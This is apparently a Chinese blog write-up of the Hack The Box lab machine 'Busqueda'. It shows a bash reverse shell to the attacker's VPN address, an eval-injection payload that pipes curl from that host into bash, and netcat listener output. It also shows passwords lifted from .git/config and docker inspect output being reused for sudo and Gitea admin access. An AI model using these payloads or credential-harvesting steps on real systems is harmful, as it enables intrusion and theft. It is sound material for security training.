<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
<p>(不明觉厉o(￣▽￣)ｄ )</p>
<p>。。。然后捏，我没监听到东西。</p>
<p>好吧，<strong>是因为kali有防火墙</strong></p>
<p><code>sudo systemctl stop ufw</code></p>
<p><code>sudo systemctl disable ufw</code></p>
<p>将防火墙禁用，重新发包即可。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
<p>nc监听成功。</p>
<p>然后在nc窗口下</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>

<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-l长格式信息,-a 所有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>

<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下config和logs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>

<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
<p>关注下这串代码：</p>
<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
<p>尝试下cody后的东西作为密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#x76;&#99;&#64;&#49;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#x31;&#x2e;&#x32;&#48;&#x38;">&#115;&#x76;&#99;&#64;&#49;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#x31;&#x2e;&#x32;&#48;&#x38;</a>，ssh连接即可。</p>
<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>之后的操作便是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
<p>切换到主机的终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>

<p>打开浏览器输入<a href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
<p>点击右上角sign in 出现</p>
<p><img src="/../../../Typora/img111/image-20230606214158201.png" alt="image-20230606214158201"></p>
<p>先放一遍。</p>
<p>再次在svc用户界面下，</p>
<p>sudo -l，</p>
<p>关注以下操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对这三个命令依次运行一下，</p>
<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
<p>doker-inspect官方说明得：</p>
<p><a href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
<p>例子：</p>
<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
<p>先看ID1的：</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有数据库信息为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
</blockquote>
<p>看下另一个ID的</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
</blockquote>
<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
<p><img src="/../../../Typora/img111/image-20230607201649485.png" alt="image-20230607201649485"></p>
<p>点击左边的仓库，发现：</p>
<p><img src="/../../../Typora/img111/image-20230607201740407.png" alt="image-20230607201740407"></p>
<p>查看第一行脚本：</p>
<p><img src="/../../../Typora/img111/image-20230607201759588.png" alt="image-20230607201759588"></p>
<p>前三个脚本对应了，之前的三个命令。</p>
<p>查看第四个脚本内容，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
